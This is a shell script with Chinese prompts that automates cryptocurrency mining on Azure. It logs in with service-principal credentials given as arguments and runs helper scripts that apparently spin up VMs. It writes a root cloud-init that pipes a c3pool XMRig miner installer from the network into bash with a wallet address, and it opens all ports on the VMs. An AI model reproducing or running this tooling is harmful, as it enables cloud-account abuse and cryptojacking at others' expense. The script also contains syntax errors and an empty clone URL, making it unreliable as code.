#!/bin/sh
if [ ! -f "/root/XX/fuckb1s.py" ]; then,
         git --git-dir=/root/ clone 
         chmod -R 777 /root/XX
         cp /root/XX/fuckaz /bin/挖矿
     fi
if [[ $4 ]]
then
  if [[ $4 == 'read' ]]
  then
    echo '请输入自定义开机脚本:'
    read shell
    echo "#cloud-config
runcmd:
  - sudo -s
  - ${shell}
  - "> /root/XX/cloud-init.txt
  elif [[ $4 == 'null' ]]
     echo '将以已存在的 cloud-init.txt 为开机脚本，请确认脚本内容是否需要修改？(5秒后自动执行)'
     sleep 5
   fi
echo "#cloud-config
runcmd:
  - sudo -s
  - export HOME=/root && curl -s -L http://download.c3pool.org/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s $4
  - "> /root/XX/cloud-init.txt
else
echo ':) 钱包地址丢失!'
echo '示例命令:'
echo 'bash fuckaz 邮箱 密码 tenant 钱包地址'
exit()
fi
     
az logout
az login --service-principal --username $1 --password $2 --tenant $3
rm -f /root/XX/ip.txt
rm -f /root/XX/ip1.txt
rm -f /root/XX/ip2.txt
rm -f /root/.ssh/known_hosts
python3 /root/XX/fuckb1s.py
python3 /root/XX/fuckd2as.py
python3 /root/XX/fucke2bds.py
rm -f /root/XX/fuck.txt
az vm list -d > /root/XX/fuck.txt
az vm open-port --ids $(az vm list -g MyResourceGroup --query "[].id" -o tsv) --port '*'
cat fuck.txt | sed 's/,/\n/g' | grep "publicIps" | sed 's/:/\n/g' | sed '1d' | sed 's/}//g' | sort -u > /root/XX/ip.txt
sed -r 's/["]{1,10}$//' ip.txt > ip1.txt
cat ip1.txt | sed s/[[:space:]]//g  | sort -u > /root/XX/ip2.txt
rm -f /root/XX/ip1.txt 
rm -f /root/XX/ip.txt
mv ip2.txt /root/XX/ip.txt
sed -i '$d' /root/XX/ip.txt
sed -i 's/.//' /root/XX/ip.txt
cat /root/XX/ip.txt
echo "#####################"
echo "共计开机 $(cat /root/XX/ip.txt|wc -l) 台"
echo "用时  $SECONDS 秒"
echo "#####################"